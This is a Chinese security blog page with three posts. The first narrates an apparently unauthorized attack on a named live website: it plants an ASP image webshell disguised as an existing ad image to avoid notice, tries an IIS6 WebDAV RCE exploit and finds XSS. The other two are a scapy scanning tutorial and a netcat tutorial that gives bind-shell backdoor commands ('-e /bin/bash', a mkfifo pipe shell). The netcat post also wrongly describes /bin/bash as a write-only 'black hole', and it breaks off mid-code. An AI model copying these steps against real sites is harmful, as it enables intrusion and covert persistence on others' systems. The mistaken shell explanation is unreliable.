<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/10.jpg" alt="10"></p>
<h2 id="0x3-文件上传"><a href="#0x3-文件上传" class="headerlink" title="0x3 文件上传"></a>0x3 文件上传</h2><p>在广告管理模块中可以修改广告图片，并且可以自己上传本地图片。</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/11.jpg" alt="11"></p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/12.jpg" alt="12"></p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/13.jpg" alt="13"></p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/14.jpg" alt="14"></p>
<p>这里首先尝试上传一个asp的一句话木马，发现.asp后缀的文件被禁了，测试了一下，上传a.b文件，发现还是提示错误，说明是白名单；</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/16.jpg" alt="16"></p>
<p>本来是想用抓包然后用%00截断试一试的，但发现抓不到包，害，可能是自己太菜了。然后我换了另外一种思路，就是先上传shell.jpg，然后再将文件重命名为shell.asp，但是发现文件扩展名不能修改成asp，这里也是白名单。</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/20.jpg" alt="20"></p>
<p>没思路了，希望大佬能够指点指点（膜拜大佬）。</p>
<p>这里是可以上传图片马的。</p>
<p>制做asp图片马：</p>
<img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/17.jpg" alt="17" style="zoom:200%;">

<p>思路是将网站上原本存在的图片下载到本地，制作成图片马，然后再上传到网站上替换掉原来的图片，这样不容易被发现（手动滑稽），这里我替换的是a(1).jpg。查看替换后的图片，可以正常显示，将图片下载到本地，用Notepad++打开，可以看到一句话木马，图片马上传成功。</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/18.jpg" alt="18"></p>
<p>如果后续有文件包含的话就可以利用。</p>
<h2 id="0x3-IIS6-0"><a href="#0x3-IIS6-0" class="headerlink" title="0x3 IIS6.0"></a>0x3 IIS6.0</h2><p>网站使用的是 IIS6.0 的服务器，搜索发现IIS6.0主要有两个漏洞点：</p>
<ol>
<li>IIS6.0 WebDav远程命令执行漏洞 </li>
<li>IIS6.x解析漏洞</li>
</ol>
<p><strong>IIS6.0 WebDav远程命令执行漏洞</strong></p>
<p>原理及利用方法：</p>
<p> <a href="https://thief.one/2017/03/29/IIS6-0远程命令执行漏洞-CVE-2017-7269/">https://thief.one/2017/03/29/IIS6-0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-7269/</a> </p>
<p>这里需要注意上面的师傅提供的exp结尾少了一个end，建议去官网找： <a href="https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2">https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2</a> </p>
<p>这个漏洞的利用条件需要服务器开启了WebDav； </p>
<p>判断网站是否开启WebDav：<a href="https://blog.csdn.net/na_tion/article/details/53020936">https://blog.csdn.net/na_tion/article/details/53020936</a> </p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/21.jpg" alt="21"></p>
<p>网站开启了WebDAV，美滋滋。</p>
<p>获取网站IP：<a href="https://ping.chinaz.com/http://www.ntwq.cn/">https://ping.chinaz.com/http://www.ntwq.cn/</a> ，没有开CDN，直接可以看到IP；</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/22.jpg" alt="22"></p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/23.jpg" alt="23"></p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/24.jpg" alt="24"></p>
<p>这里没有利于成功，可能网站已经打了补丁<del>~</del></p>
<p><strong>IIS6.x解析漏洞</strong></p>
<p>漏洞原理：基于文件名；该版本默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析; 号及其后面的内容，相当于截断。</p>
<p>这里尝试上传木马，结果发现网站会将 . 号和 ; 号替换为 _ (下划线)。</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/25.jpg" alt="25"></p>
<p>这里尝试修改文件名也没有成功。</p>
<h2 id="0x4-WebDAV"><a href="#0x4-WebDAV" class="headerlink" title="0x4 WebDAV"></a>0x4 WebDAV</h2><blockquote>
<p>WebDAV是一组基于超文本传输协议的技术集合，有利于用户间协同编辑和管理存储在万维网服务器文档。通俗一点儿来说，WebDAV就是一种互联网方法，应用此方法可以在服务器上划出一块存储空间，可以使用用户名和密码来控制访问，让用户可以直接存储、下载、编辑文件。 </p>
</blockquote>
<p>在0x3中发现网站开启了WebDAV，WebDAV可以上传文件（PUT）或者修改文件名（MOVE）。、</p>
<p>利用方法：</p>
<p> <a href="https://blog.csdn.net/na_tion/article/details/53020936">https://blog.csdn.net/na_tion/article/details/53020936</a> </p>
<p> <a href="https://blog.csdn.net/yumiweitaozi/article/details/105229336">https://blog.csdn.net/yumiweitaozi/article/details/105229336</a> </p>
<ol>
<li><p>尝试上传文件</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/26.jpg" alt="26"></p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/27.jpg" alt="27"></p>
<p>txt或其他类型的文件提示没有权限，asp，aspx则直接404；网站应该是有防护软件。</p>
</li>
<li><p>尝试修改文件名</p>
<p>之前上传的木马文件被改成 1_asp_.jpg ，尝试用MOVE和COPY修改文件名；需要用到工具：IISPutScanner；</p>
<p>这里不允许MOVE，但是可以COPY；</p>
<img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/28.jpg" alt="28" style="zoom:200%;">

<p>一直提示错误。。。</p>
</li>
</ol>
<h2 id="0x5-CKeditor-CKFinder"><a href="#0x5-CKeditor-CKFinder" class="headerlink" title="0x5 CKeditor + CKFinder"></a>0x5 CKeditor + CKFinder</h2><p>网站使用的是CKeditor编辑器。</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/29.jpg" alt="29"></p>
<p>扫描目录，逐个访问，没有发现什么有价值的信息，因为很多目录和文件都禁止访问。</p>
<p>上网查找CKeditor编辑器的漏洞，发现有asp目录和asp文件：</p>
<p> <a href="https://blog.rookiehacker.org/2019/03/19/fckeditorandckeditor/">https://blog.rookiehacker.org/2019/03/19/fckeditorandckeditor/</a> </p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/30.jpg" alt="30"></p>
<p>思路是上传文件到asp目录或者写入木马到asp文件。</p>
<p>同时还发现另外一个文件夹Files，尝试上传文件，但还是白名单，可以上传txt文件，图片文件。</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/31.jpg" alt="31"></p>
<p>CKeditor编辑器可以通过抓包修改参数来创建文件夹：<a href="https://blog.csdn.net/u011781521/article/details/59057759">https://blog.csdn.net/u011781521/article/details/59057759</a> </p>
<p>但是还是没法创建，可能是因为没有权限；</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/32.jpg" alt="32"></p>
<h2 id="0x6-XSS"><a href="#0x6-XSS" class="headerlink" title="0x6 XSS"></a>0x6 XSS</h2><p>网站是存在XSS漏洞的，而且没有进行任何防护。</p>
<p><img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/33.jpg" alt="33"></p>
<img src="/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/34.jpg" alt="34" style="zoom:200%;">



<h2 id="0x7-总结"><a href="#0x7-总结" class="headerlink" title="0x7 总结"></a>0x7 总结</h2><p>虽然这次没有拿到shell，但还是学到了不少东西。</p>
</div></article></div><div class="card"><div class="card-image"><a class="image is-7by3" href="/%E5%AE%9E%E6%88%981-%E4%BD%BF%E7%94%A8scapy%E5%AE%9A%E5%88%B6%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BF%9B%E8%A1%8C%E9%AB%98%E7%BA%A7%E6%89%AB%E6%8F%8F/"><img class="thumbnail" src="/%E5%AE%9E%E6%88%981-%E4%BD%BF%E7%94%A8scapy%E5%AE%9A%E5%88%B6%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BF%9B%E8%A1%8C%E9%AB%98%E7%BA%A7%E6%89%AB%E6%8F%8F/1.jpg" alt="实战1-使用scapy定制数据包进行高级扫描"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-09-16T14:51:08.000Z" title="2020-09-16T14:51:08.000Z">2020-09-16</time><span class="level-item"><a class="link-muted" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a></span><span class="level-item">3 分钟 读完 (大约 513 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/%E5%AE%9E%E6%88%981-%E4%BD%BF%E7%94%A8scapy%E5%AE%9A%E5%88%B6%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BF%9B%E8%A1%8C%E9%AB%98%E7%BA%A7%E6%89%AB%E6%8F%8F/">实战1-使用scapy定制数据包进行高级扫描</a></h1><div class="content"><a id="more"></a>

<blockquote>
<p> Scapy 是一个可以让用户发送、侦听和解析并伪装网络报文的 Python 程序，这些功能可以用于制作侦测、扫描和攻击网络的工具。</p>
</blockquote>
<p><strong>kali主机：</strong>192.168.43.52 </p>
<p><strong>Metasploit主机：</strong>192.168.43.41</p>
<h2 id="scapy定制ARP协议"><a href="#scapy定制ARP协议" class="headerlink" title="scapy定制ARP协议"></a>scapy定制ARP协议</h2><p>使用ARP().display()来查看ARP函数的作用：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ARP().display()</span><br><span class="line">###[ ARP ]### </span><br><span class="line">  hwtype= <span class="number">0x1</span>	硬件类型</span><br><span class="line">  ptype= IPv4	协议类型</span><br><span class="line">  hwlen= None	硬件地址长度（MAC）</span><br><span class="line">  plen= None	协议地址长度（IP）</span><br><span class="line">  op= who-has	who-has查询</span><br><span class="line">  hwsrc= <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">1f</span>:<span class="number">53</span>:<span class="number">0</span>c	源MAC地址</span><br><span class="line">  psrc= <span class="number">192.168</span><span class="number">.43</span><span class="number">.52</span>	源IP地址</span><br><span class="line">  hwdst= <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>	目的端的MAC地址</span><br><span class="line">  pdst= <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>	目标IP</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>向Metasploit主机发送arp请求：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sr1函数的功能是发送和接收数据包</span></span><br><span class="line">&gt;&gt;&gt; sr1(ARP(pdst=<span class="string">"192.168.43.41"</span>))</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending <span class="number">1</span> packets.</span><br><span class="line">*</span><br><span class="line">Received <span class="number">1</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets</span><br><span class="line">&lt;ARP  hwtype=<span class="number">0x1</span> ptype=IPv4 hwlen=<span class="number">6</span> plen=<span class="number">4</span> op=<span class="keyword">is</span>-at hwsrc=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">64</span>:<span class="number">11</span>:<span class="number">56</span> psrc=<span class="number">192.168</span><span class="number">.43</span><span class="number">.41</span> hwdst=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">1f</span>:<span class="number">53</span>:<span class="number">0</span>c pdst=<span class="number">192.168</span><span class="number">.43</span><span class="number">.52</span> |&lt;Padding  load=<span class="string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span> |&gt;&gt;        	<span class="comment">//psrc=192.168.43.41说明Metasploit主机已经接收到我们发送的数据包并返回应答包                                                         </span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>



<h2 id="scapy定制Ping包"><a href="#scapy定制Ping包" class="headerlink" title="scapy定制Ping包"></a>scapy定制Ping包</h2><p>IP()生成ping包的源IP和目标IP，ICMP()生成ping包的类型。</p>
<p>使用IP().display()和ICMP().display()查看IP函数和ICMP函数的作用：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; IP().display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  <span class="attr">version=</span> <span class="number">4</span></span><br><span class="line">  <span class="attr">ihl=</span> None</span><br><span class="line">  <span class="attr">tos=</span> <span class="number">0</span>x0</span><br><span class="line">  <span class="attr">len=</span> None</span><br><span class="line">  <span class="attr">id=</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">flags=</span> </span><br><span class="line">  <span class="attr">frag=</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">ttl=</span> <span class="number">64</span></span><br><span class="line">  <span class="attr">proto=</span> hopopt</span><br><span class="line">  <span class="attr">chksum=</span> None</span><br><span class="line">  <span class="attr">src=</span> <span class="number">127.0</span>.<span class="number">0.1</span>	源地址</span><br><span class="line">  <span class="attr">dst=</span> <span class="number">127.0</span>.<span class="number">0.1</span>	目标地址</span><br><span class="line">  \options\</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; ICMP().display()</span><br><span class="line"><span class="comment">###[ ICMP ]### </span></span><br><span class="line">  <span class="attr">type=</span> echo-request	ping包的类型</span><br><span class="line">  <span class="attr">code=</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">chksum=</span> None</span><br><span class="line">  <span class="attr">id=</span> <span class="number">0</span>x0</span><br><span class="line">  <span class="attr">seq=</span> <span class="number">0</span>x0</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li>修改IP包的dst（目的地址）；</li>
<li>拼接上ICMP的数据包类型；</li>
<li>使用sr1()发送数据包和接收数据包 。</li>
</ol>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;IP  <span class="attribute">version</span>=4 <span class="attribute">ihl</span>=5 <span class="attribute">tos</span>=0x0 <span class="attribute">len</span>=28 <span class="attribute">id</span>=45402 flags= <span class="attribute">frag</span>=0 <span class="attribute">ttl</span>=64 <span class="attribute">proto</span>=icmp <span class="attribute">chksum</span>=0xf1d8 <span class="attribute">src</span>=192.168.43.41 <span class="attribute">dst</span>=192.168.43.52 |&lt;ICMP  <span class="attribute">type</span>=echo-reply <span class="attribute">code</span>=0 <span class="attribute">chksum</span>=0xffff <span class="attribute">id</span>=0x0 <span class="attribute">seq</span>=0x0 |&lt;Padding  <span class="attribute">load</span>=<span class="string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span> |&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>



<h2 id="scapy定制TCP协议SYN请求"><a href="#scapy定制TCP协议SYN请求" class="headerlink" title="scapy定制TCP协议SYN请求"></a>scapy定制TCP协议SYN请求</h2><p>查看TCP函数的用法：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; TCP().display()</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">  <span class="attr">sport=</span> ftp_data</span><br><span class="line">  <span class="attr">dport=</span> http</span><br><span class="line">  <span class="attr">seq=</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">ack=</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">dataofs=</span> None</span><br><span class="line">  <span class="attr">reserved=</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">flags=</span> S</span><br><span class="line">  <span class="attr">window=</span> <span class="number">8192</span></span><br><span class="line">  <span class="attr">chksum=</span> None</span><br><span class="line">  <span class="attr">urgptr=</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">options=</span> []</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>发送SYN数据包：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sr1(<span class="constructor">IP(<span class="params">dst</span>=<span class="string">"192.168.43.41"</span>)</span>/<span class="constructor">TCP(<span class="params">flags</span>=<span class="string">"S"</span>,<span class="params">dport</span>=80)</span>,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="comment">//flags="S"表示SYN数据包，dport=80表示目标端口为80</span></span><br></pre></td></tr></table></figure>

<p><img src="/%E5%AE%9E%E6%88%981-%E4%BD%BF%E7%94%A8scapy%E5%AE%9A%E5%88%B6%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BF%9B%E8%A1%8C%E9%AB%98%E7%BA%A7%E6%89%AB%E6%8F%8F/2.jpg" alt="2"></p>
<p>我们收到一个flags=SA的数据包。SA标志表示SYN+ACK，我们收到服务器tcp三次插手中的第二个<br>包，能收到回应，表示80端口开放。  </p>
<p><strong>注：</strong>这种基于tcp的半连接扫描，更隐密，更不容易被发现。 </p>
</div></article></div><div class="card"><div class="card-image"><a class="image is-7by3" href="/NetCat%EF%BC%88nc%EF%BC%89/"><img class="thumbnail" src="/NetCat%EF%BC%88nc%EF%BC%89/15.jpg" alt="NetCat（nc）"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-09-12T05:35:02.000Z" title="2020-09-12T05:35:02.000Z">2020-09-12</time><span class="level-item"><a class="link-muted" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a></span><span class="level-item">8 分钟 读完 (大约 1266 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/NetCat%EF%BC%88nc%EF%BC%89/">NetCat（nc）</a></h1><div class="content"><a id="more"></a>

<blockquote>
<p>nc在各大发行版本中都默认安装。测试版本：OpenBSD版本。</p>
</blockquote>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install nc-openbsd</span><br></pre></td></tr></table></figure>



<h2 id="端口测试"><a href="#端口测试" class="headerlink" title="端口测试"></a>端口测试</h2><p>测试服务器 A （192.168.1.107）主机上是否开启22端口</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vz <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span> <span class="number">22</span>  <span class="comment">// v表示显示详细信息，z表示不发送数据</span></span><br></pre></td></tr></table></figure>

<img src="/NetCat%EF%BC%88nc%EF%BC%89/1.jpg" alt="1" style="zoom:200%;">

<p>nc后面的22端口也可以写成一个范围进行扫描：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -w <span class="number">3</span> -z <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span> <span class="number">22</span><span class="number">-8080</span>  <span class="comment">//w设置扫描超时时间</span></span><br></pre></td></tr></table></figure>



<h2 id="传输测试"><a href="#传输测试" class="headerlink" title="传输测试"></a>传输测试</h2><p>被测试主机 A（192.168.1.107）</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p <span class="number">8080</span>  <span class="comment">//监听8080端口</span></span><br></pre></td></tr></table></figure>

<p>测试主机 B （192.168.1.198 ）</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span> <span class="number">8080</span> <span class="comment">//在A主机上连接B主机</span></span><br></pre></td></tr></table></figure>

<img src="/NetCat%EF%BC%88nc%EF%BC%89/3.jpg" alt="3" style="zoom:200%;">

<img src="/NetCat%EF%BC%88nc%EF%BC%89/2.jpg" alt="2" style="zoom:200%;">

<p>连接成功后在测试主机上随便输入点内容，在被测主机上都会显示，在被测主机上输出的内容同样也会在测试主机上显示。Ctrl+c 断开连接。</p>
<h2 id="测试UDP会话"><a href="#测试UDP会话" class="headerlink" title="测试UDP会话"></a>测试UDP会话</h2><p>被测试主机 A（192.168.1.107）</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -u -p <span class="number">8080</span>  <span class="comment">//监听8080端口</span></span><br></pre></td></tr></table></figure>

<p>测试主机 B （192.168.1.198 ）</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -u <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span> <span class="number">8080</span> <span class="comment">//在A主机上连接B主机</span></span><br></pre></td></tr></table></figure>

<img src="/NetCat%EF%BC%88nc%EF%BC%89/4.jpg" alt="3" style="zoom:200%;">

<img src="/NetCat%EF%BC%88nc%EF%BC%89/5.jpg" alt="2" style="zoom:200%;">



<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>在A主机上监听端口</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p <span class="number">8080</span> &gt; image.jpg</span><br></pre></td></tr></table></figure>

<p>将B主机上的图片传输到A主机</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span> <span class="number">8080</span> &lt; image.jpg</span><br></pre></td></tr></table></figure>

<img src="/NetCat%EF%BC%88nc%EF%BC%89/6.jpg" alt="6" style="zoom:200%;">

<p>传输成功，Ctrl+c 断开连接。</p>
<p>如果需要在传输完成后就关闭连接，可以加上 -N 参数：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -N <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span> <span class="number">8080</span> &lt; image.jpg</span><br></pre></td></tr></table></figure>



<h2 id="网络吞吐量测试"><a href="#网络吞吐量测试" class="headerlink" title="网络吞吐量测试"></a>网络吞吐量测试</h2><p>服务端：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p <span class="number">8080</span> &gt; ./test</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dd搭配nc</span></span><br><span class="line">dd <span class="keyword">if</span>=./exp bs=<span class="number">1</span>MB count=<span class="number">100</span> | nc -n -N <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>-n 的意思是不解析域名，避免解析域名浪费时间造成误差。</p>
<img src="/NetCat%EF%BC%88nc%EF%BC%89/7.jpg" alt="7" style="zoom:200%;">

<p>通过计算可以得到传输速率。</p>
<p>上面的方法把建立连接和握手的时间以及TCP窗口慢启动的时间都计算进去了，不是特别准确，最精确的方式是搭配 pv 命令使用（监控统计管道数据的速度）。</p>
<p>安装pv：</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> pv</span><br></pre></td></tr></table></figure>

<p>在服务端运行：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p <span class="number">8080</span> | pv -W  <span class="comment">// W 选项设置从开始传输是再计时</span></span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">192.168</span><span class="number">.1</span><span class="number">.107</span> <span class="number">8080</span> &lt; ./test</span><br></pre></td></tr></table></figure>

<p>pv能够统计带宽。</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%%EOF <span class="number">192</span>MiB <span class="number">0</span>:<span class="number">00</span>:<span class="number">29</span> [<span class="number">6.85</span>MiB/s] [</span><br></pre></td></tr></table></figure>

<p><img src="/NetCat%EF%BC%88nc%EF%BC%89/8.jpg" alt="8"></p>
<h2 id="系统后门"><a href="#系统后门" class="headerlink" title="系统后门"></a>系统后门</h2><p>假设你用串口登录到 A 主机，上面十分原始，包管理系统都没有，sshd/telnetd 都跑不起来，这时候你想用 B 主机通过网络登录 A 主机，可以使用nc的 -e 参数；<strong>GNU 版本</strong>的 netcat 的 -e 参数，可以在连接建立的时候执行一个程序，并把它的标准输入输出重定向到网络连接上来，于是我们可以在 <strong>A 主机</strong>上 -e 一下 bash： </p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p <span class="number">2020</span> -e /bin/bash  <span class="comment">//打开系统后门（后门bash可以执行系统命令）</span></span><br></pre></td></tr></table></figure>

<p><strong>B主机：</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">192.168</span><span class="number">.1</span><span class="number">.248</span> <span class="number">2020</span></span><br></pre></td></tr></table></figure>

<img src="/NetCat%EF%BC%88nc%EF%BC%89/9.jpg" alt="9" style="zoom:200%;">

<img src="/NetCat%EF%BC%88nc%EF%BC%89/10.jpg" alt="10" style="zoom:200%;">

<p>成功在B主机上面登录A主机的shell。<br>对于openbsd版本的nc，没有 -e 选项，如果想完成上面的操作，可以通过管道来完成：</p>
<p><strong>A主机：</strong></p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkfifo <span class="meta-keyword">/tmp/</span>f</span><br><span class="line">cat <span class="meta-keyword">/tmp/</span>f | <span class="meta-keyword">/bin/</span>bash <span class="number">2</span>&gt;<span class="variable">&amp;1</span> | nc -l -p <span class="number">8080</span> &gt; <span class="meta-keyword">/tmp/</span>f</span><br><span class="line">对于<span class="variable">&amp;1</span>更准确的说应该是文件描述符<span class="number">1</span>,而<span class="number">1</span>标识标准输出stdout；对于<span class="number">2</span>，表示标准错误stderr。<span class="number">2</span>&gt;<span class="variable">&amp;1</span> 的意思就是将标准错误重定向到标准输出</span><br><span class="line">这里标准输出已经重定向到了<span class="meta-keyword">/bin/</span>bash，那么标准错误也会输出到<span class="meta-keyword">/bin/</span>bash</span><br><span class="line">可以把<span class="meta-keyword">/bin/</span>bash看作<span class="string">"黑洞"</span>，它等价于一个只写文件，所有写入它的内容都会永远丢失，而尝试从它那儿读取内容则什么也读不到；偶尔也可以把&amp;在命令的最后加上，表示让程序后台执行</span><br><span class="line"></span><br><span 